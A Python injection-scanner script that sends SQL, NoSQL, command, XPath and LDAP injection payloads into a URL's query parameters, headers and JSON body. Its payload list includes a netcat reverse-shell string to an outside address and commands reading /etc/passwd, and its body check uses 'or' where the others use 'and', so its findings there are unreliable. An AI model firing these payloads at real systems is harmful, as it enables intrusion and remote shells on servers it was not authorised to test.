import requests
from urllib.parse import urlencode, urlparse, parse_qsl

def check_injection_attacks(method, url, headers, body=None):
    if body is None:
        body = {}
    
    payloads = [
        # SQL Injection Payloads
        "' OR 1=1--", "admin' --", "admin' #", "admin'/*", "' OR 'a'='a",
        "') OR ('a'='a", "' OR 1=1#", "' OR 1=1/*", "UNION SELECT NULL, NULL--", "' OR '1'='1'",
        # NoSQL Injection Payloads
        { "$ne": None }, { "$gt": "" }, { "$regex": "" }, { "$ne": "" }, { "$ne": 1 },
        { "$exists": True }, { "$nin": [1,2,3] },
        # Command Injection Payloads
        '; ls -la', '| cat /etc/passwd', '&& whoami', '| nc -e /bin/sh 192.168.0.1 1234',
        '$(uname -a)', '$(cat /etc/passwd)',
        # XPath Injection Payloads
        "'] | //user[name/text()='admin'] | ['1'='1", "'] | //user[name/text()='admin' and password/text()=''] | ['1'='1",
        "admin' or '1'='1",
        # LDAP Injection Payloads
        "*", "*)(&", "(|(user=*", "admin*)(uid=*))(|(uid=*"
    ]

    # no_sql_payload = [
    #     { "$ne":None },
    #     { "$ne":1 },
    # ]
    
    vulnerable = False
    print("\033[94mTesting query parameters...\033[0m")
    for payload in payloads:
        parsed_url = requests.utils.urlparse(url)
        query_params = dict(parse_qsl(parsed_url.query))
        # print(parsed_url)
        # print(query_params)
        for key in query_params.keys():
            # print(key)
            temp_params = query_params.copy()
            temp_params[key] = payload
            temp_url = parsed_url._replace(query=urlencode(temp_params)).geturl()
            try:
                response = requests.request(method, temp_url, headers=headers, json=body)
                if response.status_code == 200 and "error" not in response.text.lower():
                    print(f"\033[91m[!] Possible injection vulnerability detected in query parameter '{key}' with payload: {payload} with response {response.content}\033[0m")
                    vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"\033[91m[!] An error occurred: {e}\033[0m")
    
    # Test headers
    print("\n\033[94mTesting headers...\033[0m")
    # print(headers.keys())
    for payload in payloads:
        for key in headers.keys():
            temp_headers = headers.copy()
            temp_headers[key] = payload
            try:
                response = requests.request(method, url, headers=temp_headers, json=body)
                if response.status_code == 200 and "error" not in response.text.lower():
                    print(f"\033[91m[!] Possible injection vulnerability detected in header '{key}' with payload: {payload} with response {response.content}\033[0m")
                    vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"\033[91m[!] An error occurred: {e}\033[0m")
    
    # Test body parameters
    print("\n\033[94mTesting body parameters...\033[0m")
    for payload in payloads:
        for key in body.keys():
            temp_body = body.copy()
            temp_body[key] = payload
            try:
                response = requests.request(method, url, headers=headers, json=temp_body)
                # print(method)
                # print(url)
                # print(headers)
                # print(temp_body)
                if response.status_code == 200 or "error" not in response.text.lower():
                    print(f"\033[91m[!] Possible injection vulnerability detected with payload: {payload} with response {response.content}\033[0m")
                    vulnerable = True
                    break
            except requests.exceptions.RequestException as e:
                print(f"\033[91m[!] An error occurred: {e}\033[0m")
    
    if not vulnerable:
        print("\033[92m[v] No injection vulnerabilities detected.\033[0m")
